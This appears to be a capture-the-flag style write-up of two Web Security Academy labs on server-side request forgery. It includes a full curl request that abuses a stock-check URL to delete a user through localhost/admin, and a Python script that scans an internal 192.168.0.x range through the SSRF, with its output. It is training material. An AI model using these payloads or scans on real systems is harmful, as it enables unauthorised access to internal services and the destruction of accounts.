# Server-side Request Forgery (SSRF)

SSRF vulnerabilities arise when an attacker is able to make the server-side application request external or internal locations, which are uninteded. Essentially controlling where the backend sends requests to.

A SSRF attack can allow an attacker to visit (retrieve or view) the contents of authenticated locations. It could locations such as `/admin`, where the requests are only accepted if the origin is trusted (i.e internal or on whitelist). The attacker is able to bypass this by using the server-side application to make the request to the authenticated location.

## Lab: Basic SSRF against the local server

**Lab Description**:  This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

### Lab solution

The store uses a stock check function which passes a URL for the backend to query. The request includes the following Form data: `stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1`

If the stock check URL is replaced with `http://localhost/admin`, the server returns the admin page. From here it is possible to open the response in a new tab. If the attacker tries to use the admin functionalities from their own browser, the page denies the request because it does not originate from a trusted origin.

However, trying to delete the user `carlos` provides the attacker with the URL which delete the user, and now it is possible to send the request to the delete endpoint with the correct parameters, through the stock check endpoint and achieve SSRF:

```cURL
curl 'https://0a8c00eb04add581816b3963003c0093.web-security-academy.net/product/stock' --compressed -X POST -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Referer: https://0a8c00eb04add581816b3963003c0093.web-security-academy.net/product?productId=1' -H 'Origin: https://0a8c00eb04add581816b3963003c0093.web-security-academy.net' -H 'Connection: keep-alive' -H 'Cookie: session=xEYpV6Obpy2zk2k5LpEAE2IpBCZlEGlM' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: no-cors' -H 'Sec-Fetch-Site: same-origin' -H 'TE: trailers' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-raw 'stockApi=http://localhost/admin/delete?username=carlos'

```

The above curl command was simply copied from the browser and executed with the appended `/admin/delete?username=carlos` to solve the lab.

## SSRF attacks to access other internal systems running on same network

If the targeted application is not hosted on the server vulnerable to SSRF, and the target is unreachable from the public internet, it is possible that the server vulnerable to SSRF is on the same network (or shares some VLAN) as the targeted application. Then the SSRF vulnerable application can be used to target the non-vulnerable server.

This makes SSRF vulnerable servers a great entrypoint into a network.

## Lab: Basic SSRF against another back-end system

**Lab Description**:  This lab has a stock check feature which fetches data from an internal system. To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port 8080, then use it to delete the user `carlos`.

### Lab Solution

To solve this lab it is seen that the server can be on any server in the space: `192.168.0.1 -- 192.168.0.255`. To find the correct services a scan should be conducted. As the target server is not accesible from the public internet, a script which checks the responses of the "stock" request is created to see if the response resolves to status code 200. If yes, the correct service has been found. The script looks as follows:

```Python
import requests
from bs4 import BeautifulSoup as bs
url = "https://0ab8007e03d2f3ff804b7b7700d100e7.web-security-academy.net/product/stock"
admin_url = ""
headers = {'Cookie': 'session=BrQf4eH9TTxyHZShtrr9bNh1NU3oNYM2'}
for ip_range in range(240, 256):
    print("IP: ", ip_range)
    body = { "stockApi": f'http://192.168.0.{ip_range}:8080/admin' }
    session = requests.Session()
    req = session.post(url=url, data=body)
    if(req.status_code == 200):
        print("Found admin at url: ", body)
        soup = bs(req.content)
        html = soup.prettify()
        print("Body: ", html)
        admin_url=f'http://192.168.0.{ip_range}:8080/admin/delete?username=carlos'
        break

#Delete user with SSRF
session = requests.Session()
body = { "stockApi": admin_url }
req = session.post(url=url, data=body, headers=headers)
print(req.status_code, " -- ", req.content)
```

Exert of script output

```curl
IP:  240
IP:  241
IP:  242
IP:  243
IP:  244
IP:  245
Found admin at url:  {'stockApi': 'http://192.168.0.245:8080/admin'}
  <div theme="">
   <section class="maincontainer">
    <div class="container is-page">
     <header class="navigation-header">
      <section class="top-links">
       <a href="/">
        Home
       </a>
       <p>
        |
       </p>
       <a href="/admin">
        Admin panel
       </a>
       <p>
        |
       </p>
       <a href="/my-account">
        My account
       </a>
       <p>
        |
       </p>
      </section>
     </header>
     <header class="notification-header">
     </header>
     <section>
      <h1>
       Users
      </h1>
      <div>
       <span>
        wiener -
       </span>
       <a href="/http://192.168.0.245:8080/admin/delete?username=wiener">
        Delete
       </a>
      </div>
      <div>
       <span>
        carlos -
       </span>
       <a href="/http://192.168.0.245:8080/admin/delete?username=carlos">
        Delete
       </a>
      </div>
     </section>
     <br/>
     <hr/>
    </div>
   </section>
   <div class="footer-wrapper">
   </div>
  </div>
 </body>
</html>
```

In the output of the scan, we are able to view the URL of the delete api function. This is used to delete the user `carlos`

This approach works because of SSRF. The webserver is able to access the internal service, using the call it makes with the URL in the `stockApi` field of the body, when calling `/product/stock`.

Lab is solved after the user is deleted.
